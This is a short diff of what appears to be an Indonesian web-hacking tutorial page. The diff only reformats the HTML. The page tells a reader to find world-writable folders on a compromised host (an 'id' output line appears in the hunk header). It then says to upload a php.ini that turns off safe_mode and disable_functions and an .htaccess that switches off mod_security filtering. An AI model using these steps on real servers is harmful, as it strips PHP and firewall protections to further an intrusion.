@@ -46,18 +46,21 @@ uid=501(pamz3d) gid=501(pamz3d) groups=501(pamz3d)
 <ul>
    <li>look for the folder whose permissions 777 (rwx rwx rwx)</li>
    <li>Upload file php.ini </li>
-   <pre>
-   safe_mode = OFF
-   disable_functions = NONE
-   </pre>
-   <li>And upload file .htaccess</li>
-   <pre>
-   <IfModule mod_security.c>
-   SecFilterEngine Off
-   SecFilterScanPOST Off
-   </IfModule>
-   </pre>
 </ul>
+<pre>
+safe_mode = OFF
+disable_functions = NONE
+</pre>
+<ul>
+   <li>And upload file .htaccess</li>
+ </ul>
+<pre>
+<IfModule mod_security.c>
+SecFilterEngine Off
+SecFilterScanPOST Off
+</IfModule>
+</pre>
+
 
 ### Artikel :
 <ul>
